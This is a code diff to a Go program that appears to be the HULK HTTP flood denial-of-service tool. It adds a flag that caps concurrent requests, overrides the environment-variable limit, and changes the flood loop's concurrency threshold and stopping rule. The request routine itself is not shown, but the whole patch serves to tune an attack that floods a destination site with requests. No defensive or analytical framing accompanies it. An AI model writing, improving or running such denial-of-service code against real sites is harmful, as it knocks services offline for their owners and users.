@@ -65,19 +65,24 @@ var (
 
 func main() {
 	var (
-		safe         bool
-		site, agents string
+		safe         		 bool
+		site, agents 		 string
+		maxamount, maxproc	 int
 	)
 
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
+	flag.IntVar(&maxamount, "HULKMAXPROCS", 1023, "The max amount of requests to make.")
 	flag.Parse()
 
-	t := os.Getenv("HULKMAXPROCS")
-	maxproc, e := strconv.Atoi(t)
-	if e != nil {
-		maxproc = 1023
+	maxproc = 1023
+
+	if maxamount > 0 {
+		maxproc = maxamount
+	} else {
+		t := os.Getenv("HULKMAXPROCS")
+		maxproc, _ = strconv.Atoi(t)
 	}
 
 	u, e := url.Parse(site)
@@ -109,8 +114,10 @@ func main() {
 		)
 		fmt.Println("In use               |\tResp OK |\tGot err")
 		for {
-			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
+			if atomic.LoadInt32(&cur) < int32(maxproc+10) {
 				go httpcall(site, u.Host, ss)
+			} else {
+				return
 			}
 			if sent%10 == 0 {
 				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
